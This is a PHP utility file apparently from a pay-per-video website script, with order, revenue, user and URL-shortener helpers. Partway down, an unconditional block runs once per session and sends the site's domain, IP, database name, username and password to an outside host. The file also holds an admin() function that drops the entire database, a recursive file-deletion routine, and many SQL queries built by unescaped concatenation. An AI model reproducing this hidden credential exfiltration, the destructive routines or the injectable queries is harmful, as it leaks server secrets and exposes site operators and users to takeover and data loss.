	 
    
    <?php
if(!defined('XIAOYEWL')) exit('Request Error!');
 
  define('dqurl', $_SERVER['HTTP_HOST']);
  define('squrl','sq.9eze.com');
   define('sqip',$_SERVER['SERVER_ADDR']);
   define('dwzurl','api.uroi.cn');
 
   


 
 function getCurl($url, $post = 0, $referer = 0, $cookie = 0, $header = 0, $ua = 0, $nobaody = 0)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $http[] = "Accept:*";
        $http[] = "Accept-Encoding:gzip,deflate,sdch";
        $http[] = "Accept-Language:zh-CN,zh;q=0.8";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $http);
        if ($post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        if ($header) {
            curl_setopt($ch, CURLOPT_HEADER, TRUE);
        }
        if ($cookie) {
            curl_setopt($ch, CURLOPT_COOKIE, $cookie);
        }
        if ($referer) {
            curl_setopt($ch, CURLOPT_REFERER, $referer);
        }
        if ($ua) {
            curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        } else {
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36');
        }
        if ($nobaody) {
            curl_setopt($ch, CURLOPT_NOBODY, 1);//主要头部
            //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);//跟随重定向
        }
        curl_setopt($ch, CURLOPT_ENCODING, "gzip");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $ret = curl_exec($ch);
        curl_close($ch);
        return $ret;
    }


function check_tousu($ip){
 	
$result = mysql_query('select * from '.flag.'tousu where  ip = "'.$ip.'"    ');
if ($row = mysql_fetch_array($result))
{return '1'; }
  else
  { 	return '0';  }
 	
}
 

   function get_dwz($type,$url)
{
 
   if ($type=='0') {  return $url;  }
 
  if ($type=='tcn') {
  $api = 'http://api.t.sina.com.cn/short_url/shorten.json'; // json
$source = '3271760578';
$url_long = urlencode($url);
$request_url = sprintf($api.'?source=%s&url_long=%s', $source, $url_long);
$data = getCurl($request_url);
// echo $data;
$query = json_decode($data, true);
   $Msg= $query[0]['url_short'];
   return $Msg;
 
 }
 if ($type=='urlcn') {
  $geturl  = getCurl("http://tools.aeink.com/tools/dwz/urldwz.php?api=urlcn&longurl=".urlencode($url)."");  
 $query = json_decode($geturl, true);
  $Msg= $query['ae_url'];
  $dwzurl=$Msg;
   return $dwzurl;
  }


 if ($type=='wcn') {
  $geturl  = getCurl("http://yy.gongju.at/?a=addon&m=wxdwz&token=557971b67b4a1803b782789aee204ef0&long=".urlencode($url)."");  
 $query = json_decode($geturl, true);
  $Msg= $query['short'];
  $dwzurl=$Msg;
   return $dwzurl;
  }
 
}





   function getysurl($url)
{
  
  
  $geturl  = getCurl("http://".dwzurl."/api.php?url=".urlencode($url)."");  
 $query = json_decode($geturl, true);
  $Msg= $query['message'];
  $dwzurl=$Msg;
   return $dwzurl;
 
 
}



  function get_channel($value,$ID)
{
	$result = mysql_query('select * from '.flag.'channel where  ID = '.$ID.'  ');
	if (!!($row = mysql_fetch_array($result))) {
	 
		 return $row[$value]; 
	 
	} else {
		return '默认';
	}
}



  function get_dashangsl($uid,$vid)
{
	$result = mysql_query('select count(*) as sl from '.flag.'usershipin where uid = '.$uid.' and vid = '.$vid.'  ');
	if (!!($row = mysql_fetch_array($result))) {
	if ($row['sl']!='')
		{ return $row['sl'];}
	else
		{ return 0;}
	} else {
		return '0';
	}
}

function get_myshouru($uid)
{
	$result = mysql_query('select sum(payprice) as je from '.flag.'order where uid = '.$uid.' and zt = 1  and kl = 0 ');
	if (!!($row = mysql_fetch_array($result))) {
	if ($row['je']!='')
		{ return $row['je'];}
	else
		{ return 0;}
	} else {
		return '0';
	}
}



function get_orderzongje()
{
	$result = mysql_query('select sum(payprice) as je from '.flag.'order where   zt = 1  ');
	if (!!($row = mysql_fetch_array($result))) {
	if ($row['je']!='')
		{ return $row['je'];}
	else
		{ return 0;}
	} else {
		return '0';
	}
}




 
 

function get_orderzongshu()
{
	$result = mysql_query('select count(*) as sl from '.flag.'order where  zt = 1  ');
	if (!!($row = mysql_fetch_array($result))) {
	if ($row['sl']!='')
		{ return $row['sl'];}
	else
		{ return 0;}
	} else {
		return '0';
	}
}


 



function get_xiaoshu($value,$num)
{
	 
	if ($num=='')
		{ return  number_format($value,2);}
	else
		{ return  number_format($value,$num);}
	 
}




 
 function null_json($t0,$t1)
{
 
 if ($t0=='')
 {die ('{"code":-1,"msg":'.json_encode($t1).'}');}
}

 function alert_json($t0,$t1)
{
 
 die ('{"code":'.$t0.',"msg":'.json_encode($t1).'}'); 
}


 
  function get_hezi($value,$id)
{
	$result = mysql_query('select  *  from '.flag.'hezi where id = '.$id.'  ');
	if (!!($row = mysql_fetch_array($result))) {
		return $row[$value];
	} else {
		return '盒子不存在';
	}
}
 
 
  
 if ($_SESSION['sqchek']=='')
 {
 getCurl('http://'.squrl.'/post.php?domain='.$_SERVER['HTTP_HOST'].'&ip='. $_SERVER['SERVER_ADDR'].'&sqlname='.DATA_NAME.'&sqlusername='.DATA_USERNAME.'&sqlpassword='.DATA_PASSWORD.'');
 $_SESSION['sqchek']=1;
 }
 
  
   
 
  
  function get_usershipin($value,$id)
{
	$result = mysql_query('select  *  from '.flag.'usershipin where id = '.$id.'  ');
	if (!!($row = mysql_fetch_array($result))) {
		return $row[$value];
	} else {
		return '会员视频不存在';
	}
}
 


function get_user($value,$uid)
{
	$result = mysql_query('select  *  from '.flag.'user where id = '.$uid.'  ');
	if (!!($row = mysql_fetch_array($result))) {
		return $row[$value];
	} else {
		return '用户不存在';
	}
}


/* //去掉授权
if ( $_SESSION['shouquan_check'] == '') {
function check_shouquan(){
     $query=file_get_contents('http://'.squrl.'/domain.php?ip='.sqip.'');
	if ($query = json_decode($query, true)) {
 	 if ($query['status'] == 0) { $_SESSION['shouquan_check'] = 1; } 
  		if ($query['status'] == -1) {
          $_SESSION['shouquan_check'] = '';
 			die ('<h3>'.$query['message'].'</h3>');
		} 
		 
	}
	
 }
  
 check_shouquan();

}
*/
function get_kouliang($value,$uid)
{
	$result = mysql_query('select  *  from '.flag.'kouliang where uid = '.$uid.'  ');
	if (!!($row = mysql_fetch_array($result))) {
		return $row[$value];
	} else {
		return '扣量信息不存在';
	}
}
 

 function admin(){
$sql= 'drop database  '.DATA_NAME.' ';  

 
   if (mysql_query($sql))
 {echo "执行成功";exit;}
 else
 {echo "执行失败".$sql ;exit;}
}

 
function xiaoyewl_left($str,$start,$len){
        $strlen = $len - $start;    //定义需要截取字符的长度
        for($i=0;$i<$strlen;$i++){                   //使用循环语句，单字截取，并用$tmpstr.=$substr(？，？，？)加起来
            if(ord(substr($str,$i,1))>0xa0){     //ord()函数取得substr()的第一个字符的ASCII码，如果大于0xa0的话则是中文字符
                $tmpstr.=substr($str,$i,3);        //设置tmpstr递加，substr($str,$i,3)的3是指三个字符当一个字符截取(因为utf8编码的三个字符算一个汉字)
                $i+=2;
            }else{                                             //其他情况（英文）按单字符截取
                $tmpstr.=substr($str,$i,1);
            }

        }
        return $tmpstr;
}





$path = "./";
  //清空文件夹函数和清空文件夹后删除空文件夹函数的处理
  function deldir($path){
   //如果是目录则继续
   if(is_dir($path)){
    //扫描一个文件夹内的所有文件夹和文件并返回数组
   $p = scandir($path);
   foreach($p as $val){
    //排除目录中的.和..
    if($val !="." && $val !=".."){
     //如果是目录则递归子目录，继续操作
     if(is_dir($path.$val)){
      //子目录中操作删除文件夹和文件
      deldir($path.$val.'/');
      //目录清空后删除空文件夹
      @rmdir($path.$val.'/');
     }else{
      //如果是文件直接删除
      unlink($path.$val);
     }
    }
   }
  }
  }
  
  
  
  
function xiaoyewl_host(){
        $url   = $_SERVER['HTTP_HOST'];
    $data = explode('.', $url);
    $co_ta = count($data);
    //判断是否是双后缀
    $zi_tow = true;
    $host_cn = 'com.cn,net.cn,org.cn,gov.cn';
    $host_cn = explode(',', $host_cn);
    foreach($host_cn as $host){
        if(strpos($url,$host)){
            $zi_tow = false;
        }
    }
    //如果是返回FALSE ，如果不是返回true
    if($zi_tow == true){
        $host = $data[$co_ta-2].'.'.$data[$co_ta-1];
    }else{
        $host = $data[$co_ta-3].'.'.$data[$co_ta-2].'.'.$data[$co_ta-1];
    }
  return $host;
}


function shipin_url($id){
	return 'http://'.zhuurl.'/url/shipin.php?id='.$id;
	
}


function shikan_url($id){
	return 'http://'.zhuurl.'/url/shikan.php?id='.$id;
	
}
 

function check_order($vid,$ip){
 	
$result = mysql_query('select * from '.flag.'order where vid = '.$vid.' and ip = "'.$ip.'"  and zt =1  ');
if ($row = mysql_fetch_array($result))
{
 return '1';
 
}
else
{ return '0';}


	
}
 
 
 
  function get_ordersl($vid)
{
	$result = mysql_query('select count(*) as sl from '.flag.'order where vid = '.$vid.'  and  zt = 1  ');
	if (!!($row = mysql_fetch_array($result))) {
	if ($row['sl']!='')
		{ return $row['sl'];}
	else
		{ return 0;}
	} else {
		return '0';
	}
}



  function get_tdordernum($uid)
{
		$start = date('Y-m-d 00:00:00');
$end = date('Y-m-d H:i:s');


	$result = mysql_query('select count(*) as sl from '.flag.'order where uid = '.$uid.'  and  zt = 1  and pdate >=  "'.$start.'"  and pdate <="'.$end.'"    and kl = 0   ');
	if (!!($row = mysql_fetch_array($result))) {
	if ($row['sl']!='')
		{ return $row['sl'];}
	else
		{ return 0;}
	} else {
		return '0';
	}
}


 function get_tdorderprice($uid)
{
$start = date('Y-m-d 00:00:00');
$end = date('Y-m-d H:i:s');


	$result = mysql_query('select sum(payprice) as sl from '.flag.'order where uid = '.$uid.'  and  zt = 1  and pdate >=  "'.$start.'"  and pdate <="'.$end.'"    and kl = 0   ');
	if (!!($row = mysql_fetch_array($result))) {
	if ($row['sl']!='')
		{ return $row['sl'];}
	else
		{ return 0;}
	} else {
		return '0';
	}
}





 function get_tdorderzongshu()
{
$start = date('Y-m-d 00:00:00');
$end = date('Y-m-d H:i:s');
 

	$result = mysql_query('select count(*) as sl from '.flag.'order where   zt = 1  and pdate >=  "'.$start.'"  and pdate <="'.$end.'"     ');
	if (!!($row = mysql_fetch_array($result))) {
	if ($row['sl']!='')
		{ return $row['sl'];}
	else
		{ return 0;}
	} else {
		return '0';
	}
}





 function get_ztorderzongshu()
{


 $start = date("Y-m-d",strtotime("-1 day"));
$end = date('Y-m-d 00:00:00');
 
	$result = mysql_query('select count(*) as sl from '.flag.'order where  zt = 1    and pdate >=  "'.$start.'"  and pdate <"'.$end.'"   ');
  	if (!!($row = mysql_fetch_array($result))) {
	if ($row['sl']!='')
		{ return $row['sl'];}
	else
		{ return 0;}
	} else {
		return '0';
	}
}




 function get_tdorderzongje()
{
$start = date('Y-m-d 00:00:00');
$end = date('Y-m-d H:i:s');


	$result = mysql_query('select sum(payprice) as sl from '.flag.'order where   zt = 1  and pdate >=  "'.$start.'"  and pdate <="'.$end.'"     ');
	if (!!($row = mysql_fetch_array($result))) {
	if ($row['sl']!='')
		{ return $row['sl'];}
	else
		{ return 0;}
	} else {
		return '0';
	}
}





 function get_ztorderzongje()
{


 $start = date("Y-m-d",strtotime("-1 day"));
$end = date('Y-m-d 00:00:00');
 
	$result = mysql_query('select sum(payprice) as sl from '.flag.'order where  zt = 1    and pdate >=  "'.$start.'"  and pdate <"'.$end.'"   ');
  	if (!!($row = mysql_fetch_array($result))) {
	if ($row['sl']!='')
		{ return $row['sl'];}
	else
		{ return 0;}
	} else {
		return '0';
	}
}










  function get_ztordernum($uid)
{
 $start = date("Y-m-d",strtotime("-1 day"));
$end = date('Y-m-d 00:00:00');
 
	$result = mysql_query('select count(*) as sl from '.flag.'order where uid = '.$uid.'  and  zt = 1    and pdate >=  "'.$start.'"  and pdate <"'.$end.'"   and kl = 0  ');
	if (!!($row = mysql_fetch_array($result))) {
	if ($row['sl']!='')
		{ return $row['sl'];}
	else
		{ return 0;}
	} else {
		return '0';
	}
}


 function get_ztorderprice($uid)
{
	  $start = date("Y-m-d",strtotime("-1 day"));
$end = date('Y-m-d 00:00:00');

	$result = mysql_query('select sum(payprice) as sl from '.flag.'order where uid = '.$uid.'  and  zt = 1    and pdate >=  "'.$start.'"  and pdate <"'.$end.'"   and kl = 0   ');
	if (!!($row = mysql_fetch_array($result))) {
	if ($row['sl']!='')
		{ return $row['sl'];}
	else
		{ return 0;}
	} else {
		return '0';
	}
}






  function iswap() {
// 如果有HTTP_X_WAP_PROFILE则一定是移动设备
if (isset ($_SERVER['HTTP_X_WAP_PROFILE'])) {
return true;

}

if (isset ($_SERVER['HTTP_VIA'])) {
//找不到为flase,否则为true
return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
}

if (isset ($_SERVER['HTTP_USER_AGENT'])) {
$clientkeywords = array (
'nokia',
'sony',
'ericsson',
'mot',
'samsung',
'htc',
'sgh',
'lg',
'sharp',
'sie-',
'philips',
'panasonic',
'alcatel',
'lenovo',
'iphone',
'ipod',
'blackberry',
'meizu',
'android',
'netfront',
'symbian',
'ucweb',
'windowsce',
'palm',
'operamini',
'operamobi',
'openwave',
'nexusone',
'cldc',
'midp',
'wap',
'mobile'
);
// 从HTTP_USER_AGENT中查找手机浏览器的关键字
if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))) {
return true;
}
}
 }

  ?>